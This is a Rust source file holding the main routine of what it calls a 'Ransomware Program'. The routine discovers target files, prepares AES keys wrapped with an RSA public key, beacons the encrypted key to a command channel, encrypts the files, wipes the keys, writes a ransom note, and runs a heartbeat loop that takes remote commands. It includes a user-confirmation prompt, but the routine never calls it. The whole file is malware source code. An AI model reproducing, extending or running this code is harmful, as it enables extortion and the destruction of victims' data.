use std::io::{self, Write};
use std::time::Duration;
use local_ip_address::local_ip;
use zeroize::Zeroize;
use std::sync::Arc;
use tokio::sync::{Mutex, mpsc};


use crate::communication::comm::channel::CommChannel;
use crate::core::agent_state::AgentState;
use crate::utils::{logger, note, config::AppConfig};
use crate::core::targeting;
use crate::post::{
    command_handler,
    commands::{AgentCommand, ResultQueue}
};
use crate::crypto::encryption;


pub async fn ransom(logger: Arc<logger::Logger>, config: &AppConfig, comm_channel: Arc<dyn CommChannel>,
) -> Result<(), Box<dyn std::error::Error>> {
    logger.init_file_logging(&config.log_path)?;

    let local_ip = local_ip()?;
    logger.log(&format!("Ransomware Program starting on local IP: {}", local_ip));

    // Step 1: Discover target files
    let targets = targeting::discover_files(&logger, &config.target_path)?;
    dbg!(&targets);

    // Step 2: Generate AES key and encrypt with RSA
    let public_key_path = "src/crypto/public.pem"; // TODO: Move to config
    let (mut aes_key, mut aes_iv, mut encrypted_key) = encryption::prepare_encryption_keys(public_key_path)
        .map_err(|e| {
            logger.error(&format!("Failed to prepare encryption keys: {}", e));
            e
        })?;

    // Step 3: Init command channel and result queue
    let result_queue: ResultQueue = Arc::new(Mutex::new(None));
    let (tx, rx) = mpsc::channel::<AgentCommand>(32);
    tokio::spawn(command_handler::run_command_worker(rx, Arc::clone(&result_queue)));

    // Step 5: Setup agent state
    let mut agent_state = AgentState {
        agent_id: 0,
        session_id: String::new(),
        offline: true,
        logger: Arc::clone(&logger),
        result_queue,
        tx,
        heartbeat_handle: None,
        comm_channel: Arc::clone(&comm_channel),
    };

    // Step 4: Attempt initial beacon
    agent_state.beacon(&encrypted_key).await;
    //let (agent_id, session_id) = comm_channel.initial_beacon(&logger, &encrypted_key).await;

    if agent_state.agent_id == 0 {
        agent_state.offline_mode_key(&encrypted_key).await;
    }

    // Step 6: Encrypt files
    if let Err(e) = encryption::encrypt(targets, &logger, &config.extension, aes_key, aes_iv) {
        logger.log(&format!("Error during encryption: {}", e));
    }

    // Step 7: Wipe key material
    aes_key.zeroize();
    aes_iv.zeroize();
    encrypted_key.zeroize();

    // Step 8: Display ransom note
    let _ = note::generate_note(&logger, &config.note_path);

    // Step 9: Heartbeat / reconnect loop
    loop {
        if !agent_state.offline {
            if agent_state.heartbeat_handle.is_none() {
                agent_state.heartbeat_handle = Some(agent_state.start_heartbeat());
            }

            if let Some(handle) = agent_state.heartbeat_handle.take() {
                match handle.await {
                    Ok(Ok(())) => {} // all good
                    Ok(Err(e)) => {
                        logger.log(&format!("Heartbeat failure: {e}"));
                        agent_state.offline = true;
                    }
                    Err(e) => {
                        logger.log(&format!("Heartbeat join error: {e}"));
                        agent_state.offline = true;
                    }
                }
            }
        } else {
            agent_state.offline_mode().await;
            agent_state.offline = false;
        }

        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}

fn ask_user_confirmation() -> bool {
    print!("Do you want to begin encrypting? (y/n): ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    matches!(input.trim().to_lowercase().as_str(), "y" | "yes")
}

